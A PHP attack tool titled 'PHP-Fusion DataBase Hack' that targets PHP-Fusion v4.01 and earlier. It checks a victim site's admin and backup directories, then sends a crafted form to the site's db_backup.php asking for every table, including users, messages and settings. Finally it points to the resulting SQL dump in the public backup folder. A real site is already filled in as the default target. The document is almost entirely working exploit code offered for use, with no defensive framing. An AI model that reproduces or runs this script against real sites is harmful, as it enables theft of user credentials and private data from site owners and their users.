<style>
.button {
	font-family:Tahoma,Arial,Verdana,Sans-Serif;
	font-size:10px;
	color:#000;background-color:#fff;
	height:19px;
	padding:0px 2px 0px 2px;
	border:1px #888 solid;
	margin-top:2px;
}

.textbox {
	font-family:Verdana,Tahoma,Arial,Sans-Serif;
	font-size:10px;
	color:#000;background-color:#eee;
	border:1px #999 solid;
}

.body {
	font-size:11px;
	color:#000;background-color:#fff;
	padding:2px 0px 2px 0px;
}

.bodybg {
	background-color:#fff;
	padding:10px;
	border-top:1px #000 solid;
	border-bottom:1px #000 solid;
}

.border {
	border:1px #aaa solid;
}

.capmain {
	font-family:Verdana,Tahoma,Arial,Sans-Serif;
	font-size:12px;font-weight:bold;
	color:#666;
}

.tbl-border {
	background-color:#ccc;
}

.tbl {
	font-size:11px;
	padding:2px 0px 2px 0px;
}

.tbl1 {
	font-size:11px;
	color:#000;background-color:#fff;
	padding:4px;
}

.tbl2 {
	font-size:11px;
	color:#000;background-color:#eee;
	padding:4px;
}
a {
	color:#666;
	text-decoration:none;
}

a:hover {
	color:#666;
	text-decoration:underline;
}

a.slink {
	color:#666;
	text-decoration:none;
}

a:hover.slink {
	color:#666;
	text-decoration:underline;
}

a.white {
	color:#fff;
	text-decoration:none;
}

a:hover.white {
	color:#fff;
	text-decoration:underline;
}

a.foot {
	color:#eee;
	text-decoration:none;
}

a:hover.foot {
	color:#eee;
	text-decoration:none;
}
body {
	font-family:Verdana,Tahoma,Arial,Sans-Serif;
	font-size:11px;
	margin:0px;
}
form {
	margin:0px 0px 0px 0px;
}
td {
	font-family:Verdana,Tahoma,Arial,Sans-Serif;
	font-size:11px;
}
</style>
<?
// Step One - Enter Web Address //
if(!isset($_POST["fusion_web_address"]) AND !isset($_POST["backup_filename"])){
	die("
	<title>PHP-Fusion DataBase Hack - Step One</title>
	<body bgcolor='#666666' text='#000000'><br><br><br>
	<table style='border: 1px solid rgb(0, 0, 0);' align='center' cellpadding='0' cellspacing='0' width='500'>
	<tbody><tr><td><table cellpadding='0' cellspacing='0' width='100%'><tbody></tbody></table><table class='bodybg' cellpadding='0' cellspacing='0' width='100%'>
	<tbody><tr><td><hr><table align='center' cellpadding='0' cellspacing='0' width='98%'><tbody><tr><td><table cellpadding='0' cellspacing='0' width='100%'>
	<tbody><tr><td><table cellpadding='0' cellspacing='0' width='100%'><tbody><tr><td class='capmain'>Enter Web Address</td>
	</tr></tbody></table><table cellpadding='0' cellspacing='0' width='100%'><tbody><tr><td class='body'>
						<form name='install' method='post' action='".$_SERVER['PHP_SELF']."'>
						<center><br>Type in the location to the fusion website's index page<br>
						IE: http://php-fusion.co.uk/<br><br>
						<input type='text' name='fusion_web_address' class='textbox' value='http://seniorglobe.com/' style='width: 350px'>
						<input name='stage' value='2' type='hidden'>
						<input name='next' value='Next' class='button' style='width: 50px;' type='submit'></center>
						</form>
						<br><center><font size='1'>Note: <font color='red'><i>This Script Only Works For PHP-Fusion v4.01 and lower</i></font></center></td>
	</tr></tbody></table></td></tr></tbody></table><hr>");
}

elseif (isset($_POST["fusion_web_address"]) AND !isset($_POST["passed"])) {
	function test_conn($CONN_TO) {
		@$test_connection = fopen($CONN_TO, "r");
		    if ($test_connection){$OUTCOME = "<font color='green'>Passed</font>";}
		                    else {$OUTCOME = "<font color='red'>  Failed</font>";}
	return $OUTCOME;
	}
	
	$TEST_BASE = test_conn($_POST["fusion_web_address"]);
	$TEST_ADMIN= test_conn($_POST["fusion_web_address"] . "/fusion_admin/index.php");
	$TEST_BACK= test_conn($_POST["fusion_web_address"]."/fusion_admin/db_backups");
	
	echo "<html>
	<head><title>PHP-Fusion DataBase Hack - Step Two</title><meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'></head>
	<body bgcolor='#666666' text='#000000'><br><br><br>
	<table align='center' width='500' cellspacing='0' cellpadding='0' style='border:1px #000 solid;'>
	<tr><td><table width='100%' cellspacing='0' cellpadding='0' class='bodybg'>
	<tr><td><hr><table align='center' width='98%' cellspacing='0' cellpadding='0'>
	<tr><td><table width='100%' cellpadding='0' cellspacing='0'><tr><td><table width='100%' cellpadding='0' cellspacing='0'><tr><td class='capmain'>Testing Web Address</td></tr></table>
	<table width='100%' cellpadding='0' cellspacing='0'>
	<tr><td class='body'><table border='0' cellpadding='0' cellspacing='0' width='100%' class='tbl-border'>
	<tr><td><table border='0' cellpadding='0' cellspacing='1' width='100%'><tr>
		<td width='33%' class='tbl1'>Base URL</td>
		<td align='center' width='33%' class='tbl2'>".$_POST["fusion_web_address"]."</td>
		<td align='right' width='33%' class='tbl1'>".$TEST_BASE."</td>
	</tr><tr>
		<td width='33%' class='tbl1'>Admin Directory</td>
		<td width='33%' class='tbl2'>/fusion_admin</td>
		<td align='right' width='33%' class='tbl1'>".$TEST_ADMIN."</td>
	</tr><tr>
		<td width='33%' class='tbl1'>Backup Directory</td>
		<td width='33%' class='tbl2'>/fusion_admin/db_backups</td>
		<td align='right' width='33%' class='tbl1'>".$TEST_BACK."</td>
	</tr></table></td></tr></table><center><br>";
													
	if($TEST_BASE|$TEST_ADMIN|$TEST_BACK == "<font color='green'>Passed</font>"){
		echo"
		<form method='post' action='".$_SERVER['PHP_SELF']."'>
		Okay, needed tests have passed, you may go on to the last step.<br><br>
		<input type='hidden' name='fusion_web_address' value='".$_POST["fusion_web_address"]."'>
		<table width='100%'>
		<tr>
			<td width='250'>Enter The Filename The Backup Will Be Given:</td>
			<td><input name='backup_filename' value='backupfile' type='text' class='textbox'></td>
		</tr>
		<tr>
			<td width='250'>Enter The Table Prefix:</td>
			<td><input name='table_prefix' value='fusion_' type='text' class='textbox'></td>
		</tr>
		</table>
		<input type='hidden' name='passed' value='true'>
		<input type='submit' value='Next' class='button' style='width:50px'>
		</center>
		</form>";
	}else{
		echo"
		<form method='post' action='".$_SERVER['PHP_SELF']."'>
		One or more of the tests have failed, please go back.<br><br>
		<input type='submit' value='Back' class='button' style='width:50px'>
		</center>
		</form>";
	}
	echo "</td></tr></table></td></tr></table><hr>";
}


elseif(!isset($_POST["finalize"])){

	$TABLE_PREFIX = $_POST["table_prefix"];
	die("
	<title>PHP-Fusion DataBase Hack - Step Three</title>
	<body bgcolor='#666666' text='#000000'>
	<br><br><br>
	<table style='border: 1px solid rgb(0, 0, 0);' align='center' cellpadding='0' cellspacing='0' width='500'>
	<tbody><tr><td>
	<table cellpadding='0' cellspacing='0' width='100%'><tbody></tbody></table>
	<table class='bodybg' cellpadding='0' cellspacing='0' width='100%'><tbody><tr><td><hr>
	<table align='center' cellpadding='0' cellspacing='0' width='98%'>
	<tbody><tr><td><table cellpadding='0' cellspacing='0' width='100%'><tbody><tr><td>
	<table cellpadding='0' cellspacing='0' width='100%'><tbody><tr>
	<td class='capmain'>Select Tables</td></tr></tbody></table>
	<table cellpadding='0' cellspacing='0' width='100%'><tbody><tr><td class='body'>
	Backup Will Be Located At: <font color='green'><a target='_blank' href='".$_POST["fusion_web_address"]."fusion_admin/db_backups/".$_POST["backup_filename"].".sql'>".$_POST["fusion_web_address"]."fusion_admin/db_backups/".$_POST["backup_filename"].".sql</a></font>
	<form action='".$_POST["fusion_web_address"]."fusion_admin/db_backup.php' name='frmbackup' method='post' target='_blank'>
	<table align='center' cellpadding='0' cellspacing='0'><tbody><tr><td valign='top'>
	<table align='center' cellpadding='0' cellspacing='0'><tbody>
	<input name='backup_filename' value='".$_POST["backup_filename"]."' type='hidden'>
	</tbody></table></td><td valign='top'><table border='0' cellpadding='0' cellspacing='0'>
	<tbody><tr><td >Database Tables</td></tr><tr><td>
	
	<select style='margin:5px 0px' class='textbox' id='tablelist' name='db_tables[]' size='17' multiple>
	<option value='".$TABLE_PREFIX."_article_cats' selected>".$TABLE_PREFIX."article_cats</option>
	<option value='".$TABLE_PREFIX."articles' selected>".$TABLE_PREFIX."articles</option>
	<option value='".$TABLE_PREFIX."comments' selected>".$TABLE_PREFIX."comments</option>
	<option value='".$TABLE_PREFIX."custom_pages' selected>".$TABLE_PREFIX."custom_pages</option>
	<option value='".$TABLE_PREFIX."download_cats' selected>".$TABLE_PREFIX."download_cats</option>
	<option value='".$TABLE_PREFIX."downloads' selected>".$TABLE_PREFIX."downloads</option>
	<option value='".$TABLE_PREFIX."faq_cats' selected>".$TABLE_PREFIX."faq_cats</option>
	<option value='".$TABLE_PREFIX."faqs' selected>".$TABLE_PREFIX."faqs</option>
	<option value='".$TABLE_PREFIX."forum_attachments' selected>".$TABLE_PREFIX."forum_attachments</option>
	<option value='".$TABLE_PREFIX."forums' selected>".$TABLE_PREFIX."forums</option>
	<option value='".$TABLE_PREFIX."guestbook' selected>".$TABLE_PREFIX."guestbook</option>
	<option value='".$TABLE_PREFIX."messages' selected>".$TABLE_PREFIX."messages</option>
	<option value='".$TABLE_PREFIX."news' selected>".$TABLE_PREFIX."news</option>
	<option value='".$TABLE_PREFIX."online' selected>".$TABLE_PREFIX."online</option>
	<option value='".$TABLE_PREFIX."panels' selected>".$TABLE_PREFIX."panels</option>
	<option value='".$TABLE_PREFIX."photo_albums' selected>".$TABLE_PREFIX."photo_albums</option>
	<option value='".$TABLE_PREFIX."photos' selected>".$TABLE_PREFIX."photos</option>
	<option value='".$TABLE_PREFIX."poll_votes' selected>".$TABLE_PREFIX."poll_votes</option>
	<option value='".$TABLE_PREFIX."polls' selected>".$TABLE_PREFIX."polls</option>
	<option value='".$TABLE_PREFIX."posts' selected>".$TABLE_PREFIX."posts</option>
	<option value='".$TABLE_PREFIX."settings' selected>".$TABLE_PREFIX."settings</option>
	<option value='".$TABLE_PREFIX."shoutbox' selected>".$TABLE_PREFIX."shoutbox</option>
	<option value='".$TABLE_PREFIX."site_links' selected>".$TABLE_PREFIX."site_links</option>
	<option value='".$TABLE_PREFIX."submitted_articles' selected>".$TABLE_PREFIX."submitted_articles</option>
	<option value='".$TABLE_PREFIX."submitted_links' selected>".$TABLE_PREFIX."submitted_links</option>
	<option value='".$TABLE_PREFIX."submitted_news' selected>".$TABLE_PREFIX."submitted_news</option>
	<option value='".$TABLE_PREFIX."temp' selected>".$TABLE_PREFIX."temp</option>
	<option value='".$TABLE_PREFIX."threads' selected>".$TABLE_PREFIX."threads</option>
	<option value='".$TABLE_PREFIX."users' selected>".$TABLE_PREFIX."users</option>
	<option value='".$TABLE_PREFIX."weblink_cats' selected>".$TABLE_PREFIX."weblink_cats</option>
	<option value='".$TABLE_PREFIX."weblinks' selected>".$TABLE_PREFIX."weblinks</option>
	</select>
	
	<input type='hidden' name='fusion_web_address' value='".$_POST["fusion_web_address"]."'>
	<input type='hidden' name='passed' value='true'>
	<input type='hidden' name='finalize' value='last'>
	</td></tr></tbody></table></td></tr><tr><td colspan='2' align='center'><hr>
	<input name='btn_create_backup' style='width: 100px;' value='Backup' type='submit'></td>
	</tr></tbody></table></form></td></tr></tbody></table></td></tr></tbody></table><hr>");
}
else{
	$CONN_TO = $_POST["fusion_web_address"]."fusion_admin/db_backup.php";
	HEADER("Location: ".$CONN_TO."");
}
?>

